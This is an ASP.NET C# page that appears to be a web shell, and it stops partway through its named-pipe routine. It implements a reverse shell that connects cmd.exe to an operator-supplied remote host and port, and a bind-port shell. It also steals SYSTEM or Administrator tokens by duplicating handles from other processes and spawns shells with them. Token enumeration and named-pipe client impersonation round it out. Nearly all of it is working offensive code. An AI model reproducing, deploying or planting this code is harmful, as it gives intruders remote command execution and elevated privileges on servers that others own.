<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false"  %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>

<script runat="server">
    [StructLayout(LayoutKind.Sequential)]

public struct STARTUPINFO

    {

    public int cb;

    public String lpReserved;

    public String lpDesktop;

    public String lpTitle;

    public uint dwX;

    public uint dwY;

    public uint dwXSize;

    public uint dwYSize;

    public uint dwXCountChars;

    public uint dwYCountChars;

    public uint dwFillAttribute;

    public uint dwFlags;

    public short wShowWindow;

    public short cbReserved2;

    public IntPtr lpReserved2;

    public IntPtr hStdInput;

    public IntPtr hStdOutput;

    public IntPtr hStdError;

    }



    [StructLayout(LayoutKind.Sequential)]

public struct PROCESS_INFORMATION

    {

    public IntPtr hProcess;

    public IntPtr hThread;

    public uint dwProcessId;

    public uint dwThreadId;

    }



    [StructLayout(LayoutKind.Sequential)]

public struct SECURITY_ATTRIBUTES

    {

    public int Length;

    public IntPtr lpSecurityDescriptor;

    public bool bInheritHandle;

    }





    [DllImport("kernel32.dll")]

static extern bool CreateProcess(string lpApplicationName,

        string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,

        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,

        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,

        [In] ref STARTUPINFO lpStartupInfo,

        out PROCESS_INFORMATION lpProcessInformation);



public static uint INFINITE = 0xFFFFFFFF;



    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]

internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);



internal struct sockaddr_in

    {

    /// <summary>

    /// Protocol family indicator.

    /// </summary>

    public short sin_family;

    /// <summary>

    /// Protocol port.

    /// </summary>

    public short sin_port;

    /// <summary>

    /// Actual address value.

    /// </summary>

    public int sin_addr;

    /// <summary>

    /// Address content list.

    /// </summary>

    //[MarshalAs(UnmanagedType.LPStr, SizeConst=8)]

    //public string sin_zero;

    public long sin_zero;

    }



    [DllImport("kernel32.dll")]

static extern IntPtr GetStdHandle(int nStdHandle);



    [DllImport("kernel32.dll")]

static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);



    public const int STD_INPUT_HANDLE = -10;

    public const int STD_OUTPUT_HANDLE = -11;

    public const int STD_ERROR_HANDLE = -12;



    [DllImport("kernel32")]

static extern bool AllocConsole();





    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,

        [In] SocketType socketType,

        [In] ProtocolType protocolType,

        [In] IntPtr protocolInfo,

        [In] uint group,

        [In] int flags

    );



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int inet_addr([In] string cp);

    [DllImport("ws2_32.dll")]

private static extern string inet_ntoa(uint ip);



    [DllImport("ws2_32.dll")]

private static extern uint htonl(uint ip);



    [DllImport("ws2_32.dll")]

private static extern uint ntohl(uint ip);



    [DllImport("ws2_32.dll")]

private static extern ushort htons(ushort ip);



    [DllImport("ws2_32.dll")]

private static extern ushort ntohs(ushort ip);





    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int connect([In] IntPtr socketHandle, [In] ref sockaddr_in socketAddress, [In] int socketAddressSize);



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int send(

        [In] IntPtr socketHandle,

        [In] byte[] pinnedBuffer,

        [In] int len,

        [In] SocketFlags socketFlags

    );



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int recv(

        [In] IntPtr socketHandle,

        [In] IntPtr pinnedBuffer,

        [In] int len,

        [In] SocketFlags socketFlags

    );



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int closesocket(

        [In] IntPtr socketHandle

    );



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern IntPtr accept(

        [In] IntPtr socketHandle,

        [In, Out] ref sockaddr_in socketAddress,

        [In, Out] ref int socketAddressSize

    );



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int listen(

        [In] IntPtr socketHandle,

        [In] int backlog

    );



    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]

internal static extern int bind(

        [In] IntPtr socketHandle,

        [In] ref sockaddr_in  socketAddress,

        [In] int socketAddressSize

    );





    public enum TOKEN_INFORMATION_CLASS {

        TokenUser = 1,

        TokenGroups,

        TokenPrivileges,

        TokenOwner,

        TokenPrimaryGroup,

        TokenDefaultDacl,

        TokenSource,

        TokenType,

        TokenImpersonationLevel,

        TokenStatistics,

        TokenRestrictedSids,

        TokenSessionId

    }



    [DllImport("advapi32", CharSet = CharSet.Auto)]

public static extern bool GetTokenInformation(

        IntPtr hToken,

        TOKEN_INFORMATION_CLASS tokenInfoClass,

        IntPtr TokenInformation,

        int tokeInfoLength,

        ref int reqLength);



    public enum TOKEN_TYPE {

        TokenPrimary = 1,

        TokenImpersonation

    }



    public enum SECURITY_IMPERSONATION_LEVEL {

        SecurityAnonymous,

        SecurityIdentification,

        SecurityImpersonation,

        SecurityDelegation

    }





    [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]

public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,

        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,

        String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);



    [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]

public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,

        ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,

        ref IntPtr DuplicateTokenHandle);







    const int ERROR_NO_MORE_ITEMS = 259;



    [StructLayout(LayoutKind.Sequential)]

struct TOKEN_USER

    {

   public _SID_AND_ATTRIBUTES User;

    }



    [StructLayout(LayoutKind.Sequential)]

public struct _SID_AND_ATTRIBUTES

    {

   public IntPtr Sid;

   public int Attributes;

    }



    [DllImport("advapi32", CharSet = CharSet.Auto)]

public extern static bool LookupAccountSid

        (

            [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, // name of local or remote computer

            IntPtr pSid, // security identifier

            StringBuilder Account, // account name buffer

            ref int cbName, // size of account name buffer

            StringBuilder DomainName, // domain name

            ref int cbDomainName, // size of domain name buffer

            ref int peUse // SID type

            // ref _SID_NAME_USE peUse // SID type

        );



    [DllImport("advapi32", CharSet = CharSet.Auto)]

public extern static bool ConvertSidToStringSid(

        IntPtr pSID,

        [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);





    [DllImport("kernel32.dll", SetLastError = true)]

public static extern bool CloseHandle(

        IntPtr hHandle);



    [DllImport("kernel32.dll", SetLastError = true)]

public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

    [Flags]

    public enum ProcessAccessFlags : uint

    {

        All = 0x001F0FFF,

            Terminate = 0x00000001,

            CreateThread = 0x00000002,

            VMOperation = 0x00000008,

            VMRead = 0x00000010,

            VMWrite = 0x00000020,

            DupHandle = 0x00000040,

            SetInformation = 0x00000200,

            QueryInformation = 0x00000400,

            Synchronize = 0x00100000

    }



    [DllImport("kernel32.dll")]

static extern IntPtr GetCurrentProcess();



    [DllImport("kernel32.dll")]

extern static IntPtr GetCurrentThread();





    [DllImport("kernel32.dll", SetLastError = true)]

    [return: MarshalAs(UnmanagedType.Bool)]

static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,

        IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,

        uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);



    [DllImport("psapi.dll", SetLastError = true)]

public static extern bool EnumProcessModules(IntPtr hProcess,

        [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)][In][Out] uint[] lphModule,

        uint cb,

        [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);



    [DllImport("psapi.dll")]

static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);





    //-------------------------------------------------------------------------------------------------------------------------------



    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;

    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;

    public const uint PIPE_ACCESS_INBOUND = 0x00000001;

    public const uint PIPE_WAIT = 0x00000000;

    public const uint PIPE_NOWAIT = 0x00000001;

    public const uint PIPE_READMODE_BYTE = 0x00000000;

    public const uint PIPE_READMODE_MESSAGE = 0x00000002;

    public const uint PIPE_TYPE_BYTE = 0x00000000;

    public const uint PIPE_TYPE_MESSAGE = 0x00000004;

    public const uint PIPE_CLIENT_END = 0x00000000;

    public const uint PIPE_SERVER_END = 0x00000001;

    public const uint PIPE_UNLIMITED_INSTANCES = 255;



    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;

    public const uint NMPWAIT_NOWAIT = 0x00000001;

    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;



    public const uint GENERIC_READ = (0x80000000);

    public const uint GENERIC_WRITE = (0x40000000);

    public const uint GENERIC_EXECUTE = (0x20000000);

    public const uint GENERIC_ALL = (0x10000000);



    public const uint CREATE_NEW = 1;

    public const uint CREATE_ALWAYS = 2;

    public const uint OPEN_EXISTING = 3;

    public const uint OPEN_ALWAYS = 4;

    public const uint TRUNCATE_EXISTING = 5;



    public const int INVALID_HANDLE_VALUE = -1;



    public const ulong ERROR_SUCCESS = 0;

    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;

    public const ulong ERROR_PIPE_BUSY = 231;

    public const ulong ERROR_NO_DATA = 232;

    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;

    public const ulong ERROR_MORE_DATA = 234;

    public const ulong ERROR_PIPE_CONNECTED = 535;

    public const ulong ERROR_PIPE_LISTENING = 536;



    //-------------------------------------------------------------------------------------------------------------------------------

    [DllImport("kernel32.dll", SetLastError = true)]

public static extern IntPtr CreateNamedPipe(

        String lpName,									// pipe name

        uint dwOpenMode,								// pipe open mode

        uint dwPipeMode,								// pipe-specific modes

        uint nMaxInstances,							// maximum number of instances

        uint nOutBufferSize,						// output buffer size

        uint nInBufferSize,							// input buffer size

        uint nDefaultTimeOut,						// time-out interval

        IntPtr pipeSecurityDescriptor		// SD

    );



    [DllImport("kernel32.dll", SetLastError = true)]

public static extern bool ConnectNamedPipe(

        IntPtr hHandle,									// handle to named pipe

        uint lpOverlapped					// overlapped structure

    );



    [DllImport("Advapi32.dll", SetLastError = true)]

public static extern bool ImpersonateNamedPipeClient(

        IntPtr hHandle);									// handle to named pipe



    [DllImport("kernel32.dll", SetLastError = true)]

public static extern bool GetNamedPipeHandleState(

        IntPtr hHandle,

        IntPtr lpState,

        IntPtr lpCurInstances,

        IntPtr lpMaxCollectionCount,

        IntPtr lpCollectDataTimeout,

        StringBuilder lpUserName,

        int nMaxUserNameSize

    );

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------    







protected void CallbackShell(string server, int port)

    {

    // This will do a call back shell to the specified server and port

    string request = "Shell enroute.......\n";

        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);



    IntPtr mySocket = IntPtr.Zero;

    

    sockaddr_in socketinfo;



        // Create a socket connection with the specified server and port.

        mySocket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);



        // Setup And Bind Socket

        socketinfo = new sockaddr_in();



        socketinfo.sin_family = (short) AddressFamily.InterNetwork;

        socketinfo.sin_addr = inet_addr(server);

        socketinfo.sin_port = (short) htons((ushort)port);



        //Connect

        connect(mySocket, ref socketinfo, Marshal.SizeOf(socketinfo));



        send(mySocket, bytesSent, request.Length, 0);



        SpawnProcessAsPriv(mySocket);



        closesocket(mySocket);





    }



protected void BindPortShell(int port)

    {

    // This will bind to a port and then send back a shell

    string request = "Shell enroute.......\n";

        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);



    IntPtr mySocket = IntPtr.Zero;



    sockaddr_in socketinfo;
        mySocket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();

        socketinfo.sin_family = (short)AddressFamily.InterNetwork;

        uint INADDR_ANY = 0x00000000;
        socketinfo.sin_addr = (int) htonl(INADDR_ANY);
        socketinfo.sin_port = (short)htons((ushort) port);
        bind(mySocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        listen(mySocket, 128);  
        int socketSize = Marshal.SizeOf(socketinfo);
        mySocket = accept(mySocket, ref socketinfo, ref socketSize);
        send(mySocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(mySocket);
        closesocket(mySocket);
    }



protected void SpawnProcess(IntPtr mySocket)

    {

    // Spawn a process to a socket withouth impersonation

    bool retValue;

    string Application = Environment.GetEnvironmentVariable("comspec"); 



    PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

    STARTUPINFO sInfo = new STARTUPINFO();

    SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();

        pSec.Length = Marshal.SizeOf(pSec);



        sInfo.dwFlags = 0x00000101; // STARTF.STARTF_USESHOWWINDOW | STARTF.STARTF_USESTDHANDLES;



        // Set Handles

        sInfo.hStdInput = mySocket;

        sInfo.hStdOutput = mySocket;

        sInfo.hStdError = mySocket;





        //Spawn Shell

        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);



        // Wait for it to finish

        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);

    }





protected void GetSystemToken(ref IntPtr DupeToken)

    {

        // Enumerate all accessible processes looking for a system token



    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

        sa.bInheritHandle = false;

        sa.Length = Marshal.SizeOf(sa);

        sa.lpSecurityDescriptor = (IntPtr)0;



    // Find Token

    IntPtr pTokenType = Marshal.AllocHGlobal(4);

    int TokenType = 0;

    int cb = 4;



    string astring = "";

    IntPtr token = IntPtr.Zero;

    IntPtr duptoken = IntPtr.Zero;



    IntPtr hProc = IntPtr.Zero;

    IntPtr usProcess = IntPtr.Zero;





    uint pid = 0;



        for (pid = 0; pid < 9999; pid += 4) {

            hProc = OpenProcess(ProcessAccessFlags.DupHandle, false, pid);

            usProcess = GetCurrentProcess();



            if (hProc != IntPtr.Zero) {

                for (int x = 1; x <= 9999; x += 4)

                {

                    token = (IntPtr)x;



                    if (DuplicateHandle(hProc, token, usProcess, out duptoken, 0, false, 2)) {

                        if (GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb)) {

                            TokenType = Marshal.ReadInt32(pTokenType);



                            switch ((TOKEN_TYPE)TokenType)

                            {

                            case TOKEN_TYPE.TokenPrimary:

                                astring = "Primary";

                                break;

                            case TOKEN_TYPE.TokenImpersonation:

                                // Get the impersonation level

                                GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);

                                TokenType = Marshal.ReadInt32(pTokenType);

                                switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)

                                {

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:

                                    astring = "Impersonation - Anonymous";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:

                                    astring = "Impersonation - Identification";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:

                                    astring = "Impersonation - Impersonation";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:

                                    astring = "Impersonation - Delegation";

                                    break;

                                }



                                break;

                            }





                        // Get user name

                        TOKEN_USER tokUser;

                        string username;

                            const int bufLength = 256;

                        IntPtr tu = Marshal.AllocHGlobal(bufLength);

                            cb = bufLength;

                            GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenUser, tu, cb, ref cb);

                            tokUser = (TOKEN_USER)Marshal.PtrToStructure(tu, typeof (TOKEN_USER));



                            username = DumpAccountSid(tokUser.User.Sid);



                            Marshal.FreeHGlobal(tu);



                            if (username.ToString() == "NT AUTHORITY\\\\SYSTEM") {

                                // Coverts a primary token to an impersonation

                                if (DuplicateTokenEx(duptoken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, ref DupeToken)) {

                                    // Display the token type

                                    //Response.Output.Write("* Duplicated token is {0}<br>", DisplayTokenType(DupeToken));



                                    return;

                                }

                            }

                        }

                        CloseHandle(duptoken);

                    }

                }

                CloseHandle(hProc);

            }



        }



    }



protected void GetAdminToken(ref IntPtr DupeToken)

    {

        // Enumerate all accessible processes looking for a system token



    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

        sa.bInheritHandle = false;

        sa.Length = Marshal.SizeOf(sa);

        sa.lpSecurityDescriptor = (IntPtr)0;



    // Find Token

    IntPtr pTokenType = Marshal.AllocHGlobal(4);

    int TokenType = 0;

    int cb = 4;



    string astring = "";

    IntPtr token = IntPtr.Zero;

    IntPtr duptoken = IntPtr.Zero;



    IntPtr hProc = IntPtr.Zero;

    IntPtr usProcess = IntPtr.Zero;





    uint pid = 0;



        for (pid = 0; pid < 9999; pid += 4) {

            hProc = OpenProcess(ProcessAccessFlags.DupHandle, false, pid);

            usProcess = GetCurrentProcess();



            if (hProc != IntPtr.Zero) {

                for (int x = 1; x <= 9999; x += 4)

                {

                    token = (IntPtr)x;



                    if (DuplicateHandle(hProc, token, usProcess, out duptoken, 0, false, 2)) {

                        if (GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb)) {

                            TokenType = Marshal.ReadInt32(pTokenType);



                            switch ((TOKEN_TYPE)TokenType)

                            {

                            case TOKEN_TYPE.TokenPrimary:

                                astring = "Primary";

                                break;

                            case TOKEN_TYPE.TokenImpersonation:

                                // Get the impersonation level

                                GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);

                                TokenType = Marshal.ReadInt32(pTokenType);

                                switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)

                                {

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:

                                    astring = "Impersonation - Anonymous";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:

                                    astring = "Impersonation - Identification";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:

                                    astring = "Impersonation - Impersonation";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:

                                    astring = "Impersonation - Delegation";

                                    break;

                                }



                                break;

                            }





                        // Get user name

                        TOKEN_USER tokUser;

                        string username;

                            const int bufLength = 256;

                        IntPtr tu = Marshal.AllocHGlobal(bufLength);

                            cb = bufLength;

                            GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenUser, tu, cb, ref cb);

                            tokUser = (TOKEN_USER)Marshal.PtrToStructure(tu, typeof (TOKEN_USER));



                            username = DumpAccountSid(tokUser.User.Sid);



                            Marshal.FreeHGlobal(tu);



                            if (username.EndsWith("Administrator")) {

                                // Coverts a primary token to an impersonation

                                if (DuplicateTokenEx(duptoken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, ref DupeToken)) {

                                    // Display the token type

                                    //Response.Output.Write("* Duplicated token is {0}<br>", DisplayTokenType(DupeToken));



                                    return;

                                }

                            }

                        }

                        CloseHandle(duptoken);

                    }

                }

                CloseHandle(hProc);

            }



        }



    }



protected void SpawnProcessAsPriv(IntPtr mySocket)

    {

    // Spawn a process to a socket

    

    bool retValue;

    string Application = Environment.GetEnvironmentVariable("comspec"); 



    PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

    STARTUPINFO sInfo = new STARTUPINFO();

    SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();

        pSec.Length = Marshal.SizeOf(pSec);



        sInfo.dwFlags = 0x00000101; // STARTF.STARTF_USESHOWWINDOW | STARTF.STARTF_USESTDHANDLES;



    IntPtr DupeToken = new IntPtr(0);





        // Get the token

        GetSystemToken(ref DupeToken);



        if (DupeToken == IntPtr.Zero)

            GetAdminToken(ref DupeToken);





        // Display the token type

        //Response.Output.Write("* Creating shell as {0}<br>", DisplayTokenType(DupeToken));







        // Set Handles

        sInfo.hStdInput = mySocket;

        sInfo.hStdOutput = mySocket;

        sInfo.hStdError = mySocket;





        //Spawn Shell

        if (DupeToken == IntPtr.Zero)



            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);

        else

            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);



        // Wait for it to finish

        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);



        //Close It all up

        CloseHandle(DupeToken);

    }



//--------------------------------------------------------

// Display the type of token and the impersonation level

//--------------------------------------------------------

protected StringBuilder DisplayTokenType(IntPtr token)

    {

    IntPtr pTokenType = Marshal.AllocHGlobal(4);

    int TokenType = 0;

    int cb = 4;



    StringBuilder sb = new StringBuilder();



        GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb);

        TokenType = Marshal.ReadInt32(pTokenType);



        switch ((TOKEN_TYPE)TokenType)

        {

        case TOKEN_TYPE.TokenPrimary:

            sb.Append("Primary");

            break;

        case TOKEN_TYPE.TokenImpersonation:

            // Get the impersonation level

            GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);

            TokenType = Marshal.ReadInt32(pTokenType);

            switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)

            {

                case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:

                sb.Append("Impersonation - Anonymous");

                break;

                case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:

                sb.Append("Impersonation - Identification");

                break;

                case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:

                sb.Append("Impersonation - Impersonation");

                break;

                case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:

                sb.Append("Impersonation - Delegation");

                break;

            }



            break;

        }

        Marshal.FreeHGlobal(pTokenType);

        return sb;

    }



protected void DisplayCurrentContext()

    {

        Response.Output.Write("* Thread executing as {0}, token is {1}<br>", WindowsIdentity.GetCurrent().Name, DisplayTokenType(WindowsIdentity.GetCurrent().Token));

    }



protected string DumpAccountSid(IntPtr SID)

    {

    int cchAccount = 0;

    int cchDomain = 0;

    int snu = 0;

    StringBuilder sb = new StringBuilder();



    // Caller allocated buffer

    StringBuilder Account = null;

    StringBuilder Domain = null;

    bool ret = LookupAccountSid(null, SID, Account, ref cchAccount, Domain, ref cchDomain, ref snu);

        if (ret == true)

            if (Marshal.GetLastWin32Error() == ERROR_NO_MORE_ITEMS)

                return "Error";

        try {

            Account = new StringBuilder(cchAccount);

            Domain = new StringBuilder(cchDomain);

            ret = LookupAccountSid(null, SID, Account, ref cchAccount, Domain, ref cchDomain, ref snu);

            if (ret) {

                sb.Append(Domain);

                sb.Append(@"\\");

                sb.Append(Account);

            }

            else

                sb.Append("logon account (no name) ");

        }

        catch (Exception ex)

        {

            Console.WriteLine(ex.Message);

        }

    finally {

        }



        //string SidString = null;



        //ConvertSidToStringSid(SID, ref SidString);

        //sb.Append("\nSID: ");

        //sb.Append(SidString);

        return sb.ToString();

    }



protected string GetProcessName(uint PID)

    {

    IntPtr hProc = IntPtr.Zero;

        uint[] hMod = new uint[2048];

    uint cbNeeded;

    int exeNameSize = 255;

    StringBuilder exeName = null;



        exeName = new StringBuilder(exeNameSize);





        hProc = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VMRead, false, PID);



        if (hProc != IntPtr.Zero) {

            if (EnumProcessModules(hProc, hMod, UInt32.Parse(hMod.Length.ToString()), out cbNeeded)) {



                GetModuleBaseName(hProc, hMod[0], exeName, (uint)exeNameSize);

            }



        }



        CloseHandle(hProc);



        return exeName.ToString();

    }





//***************************************************************************

// DISPLAY THE AVAILABLE TOKENS

//***************************************************************************



protected void DisplayAvailableTokens()

    {



    IntPtr pTokenType = Marshal.AllocHGlobal(4);

    int TokenType = 0;

    int cb = 4;



    string astring = "";

    IntPtr token = IntPtr.Zero;

    IntPtr duptoken = IntPtr.Zero;



    IntPtr hProc = IntPtr.Zero;

    IntPtr usProcess = IntPtr.Zero;

    



    uint pid = 0;



        for (pid = 0; pid < 9999; pid += 4) {

            hProc = OpenProcess(ProcessAccessFlags.DupHandle, false, pid);

            usProcess = GetCurrentProcess();



            if (hProc != IntPtr.Zero) {

                //Response.Output.Write("Opened process PID: {0} : {1}<br>", pid, GetProcessName(pid));



                for (int x = 1; x <= 9999; x += 4)

                {

                    token = (IntPtr)x;



                    if (DuplicateHandle(hProc, token, usProcess, out duptoken, 0, false, 2)) {

                        //Response.Output.Write("Duplicated handle: {0}<br>", x);

                        if (GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb)) {

                            TokenType = Marshal.ReadInt32(pTokenType);



                            switch ((TOKEN_TYPE)TokenType)

                            {

                            case TOKEN_TYPE.TokenPrimary:

                                astring = "Primary";

                                break;

                            case TOKEN_TYPE.TokenImpersonation:

                                // Get the impersonation level

                                GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);

                                TokenType = Marshal.ReadInt32(pTokenType);

                                switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)

                                {

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:

                                    astring = "Impersonation - Anonymous";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:

                                    astring = "Impersonation - Identification";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:

                                    astring = "Impersonation - Impersonation";

                                    break;

                                    case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:

                                    astring = "Impersonation - Delegation";

                                    break;

                                }



                                break;

                            }





                        // Get user name

                        TOKEN_USER tokUser;

                        string username;

                            const int bufLength = 256;

                        IntPtr tu = Marshal.AllocHGlobal(bufLength);

                            cb = bufLength;

                            GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenUser, tu, cb, ref cb);

                            tokUser = (TOKEN_USER)Marshal.PtrToStructure(tu, typeof (TOKEN_USER));



                            username = DumpAccountSid(tokUser.User.Sid);



                            Marshal.FreeHGlobal(tu);



                            if (username.ToString() == "NT AUTHORITY\\\\SYSTEM")

                                Response.Output.Write("[{0:0000}] - {2} : {3}</a><br>", pid, x, username, astring);

                            else if (username.EndsWith("Administrator"))

                                Response.Output.Write("[{0:0000}] - {2} : {3}</a><br>", pid, x, username, astring);

                            //else

                            //Response.Output.Write("[{0:0000}] - {2} : {3}</a><br>", pid, x, username, astring);

                        }

                        CloseHandle(duptoken);

                    }

                    else {

                        //Response.Output.Write("Handle: {0} Error: {1}<br>", x,GetLastError());

                    }

                }

                CloseHandle(hProc);

            }

            else {

                //Response.Output.Write("Failed to open process PID: {0}<br>", pid);



            }

        }

    }

protected void K_ConnectBackButton_Click(object sender, EventArgs e)

    {

    String host = txtRemoteHost.Text;

    int port = Convert.ToInt32(txtRemotePort.Text);



        CallbackShell(host, port);

    }



protected void K_BindPortButton_Click(object sender, EventArgs e)

    {



    int port = Convert.ToInt32(txtBindPort.Text);



        BindPortShell(port);

    }



protected void K_CreateNamedPipeButton_Click(object sender, EventArgs e)

    {

    String pipeName = "\\\\.\\pipe\\" + txtPipeName.Text;



    IntPtr hPipe = IntPtr.Zero;

    IntPtr secAttr = IntPtr.Zero;



        Response.Output.Write("+ Creating Named Pipe: {0}<br>", pipeName);



        hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, secAttr);



        // Check value

        if (hPipe.ToInt32() == INVALID_HANDLE_VALUE) {

            Response.Write("- Failed to create named pipe:");

            Response.End();

        }



        Response.Output.Write("+ Created Named Pipe: {0}<br>", pipeName);



        // wait for client to connect   

        Response.Write("+ Waiting for connection...<br>");



        ConnectNamedPipe(hPipe, 0);



    // Get connected user info

    StringBuilder userName = new StringBuilder(256);



        if (!GetNamedPipeHandleState(hPipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, userName, userName.Capacity)) {

